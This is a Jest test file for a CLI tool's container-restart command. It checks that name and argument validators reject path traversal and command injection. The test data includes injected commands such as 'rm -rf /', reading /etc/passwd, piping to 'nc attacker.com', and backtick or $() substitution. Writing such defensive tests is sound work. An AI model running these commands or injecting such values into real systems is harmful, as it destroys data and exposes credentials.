/**
 * @jest-environment node
 */

const restart = require('../lib/restart');
const { validateContainerName, validateComposeArgs } = require('../lib/docker');

// Mock dependencies
jest.mock('../lib/logger', () => ({
  child: () => ({
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
  }),
}));

jest.mock('../lib/services', () => ({
  findInfraDir: jest.fn(),
}));

jest.mock('../lib/rate-limiter', () => ({
  enforceRateLimit: jest.fn().mockResolvedValue(true),
}));

jest.mock('child_process', () => ({
  spawn: jest.fn(),
}));

describe('restart command', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('validateContainerName', () => {
    it('should accept valid container names', () => {
      expect(() => validateContainerName('mc-core')).not.toThrow();
      expect(() => validateContainerName('backend')).not.toThrow();
      expect(() => validateContainerName('gateway_1')).not.toThrow();
    });

    it('should reject empty names', () => {
      expect(() => validateContainerName('')).toThrow('cannot be empty');
    });

    it('should reject names with path traversal', () => {
      expect(() => validateContainerName('../etc')).toThrow('path traversal');
      expect(() => validateContainerName('..')).toThrow('path traversal');
    });

    it('should reject names with invalid characters', () => {
      expect(() => validateContainerName('test;rm')).toThrow('invalid characters');
      expect(() => validateContainerName('test|cat')).toThrow('invalid characters');
    });
  });

  describe('validateComposeArgs', () => {
    it('should accept valid restart arguments', () => {
      expect(() => validateComposeArgs(['restart', 'core'])).not.toThrow();
      expect(() => validateComposeArgs(['restart', '-t', '10', 'backend'])).not.toThrow();
    });

    it('should reject dangerous characters in arguments', () => {
      expect(() => validateComposeArgs(['restart', ';rm'])).toThrow('dangerous characters');
      expect(() => validateComposeArgs(['restart', '`whoami`'])).toThrow('dangerous characters');
    });

    it('should reject disallowed commands', () => {
      expect(() => validateComposeArgs(['exec', 'core', 'sh'])).toThrow('disallowed');
    });
  });

  describe('restart module exports', () => {
    it('should export the restart command', () => {
      expect(restart).toBeDefined();
      expect(restart.name()).toBe('restart');
    });

    it('should have description', () => {
      expect(restart.description()).toContain('Restart MasterClaw');
    });
  });

  describe('restart subcommands', () => {
    it('should have history subcommand', () => {
      const historyCmd = restart.commands.find(c => c.name() === 'history');
      expect(historyCmd).toBeDefined();
      expect(historyCmd.description()).toContain('restart history');
    });
  });
});

describe('restart security', () => {
  it('should validate service names before restart', () => {
    // Valid service names
    const validServices = ['core', 'backend', 'gateway', 'interface', 'chroma'];
    
    for (const service of validServices) {
      expect(() => validateContainerName(service)).not.toThrow();
    }
  });

  it('should block command injection attempts', () => {
    const maliciousInputs = [
      'core; rm -rf /',
      'backend && cat /etc/passwd',
      'gateway | nc attacker.com',
      'core`whoami`',
      '$(echo pwned)',
    ];

    for (const input of maliciousInputs) {
      expect(() => validateContainerName(input)).toThrow();
    }
  });
});
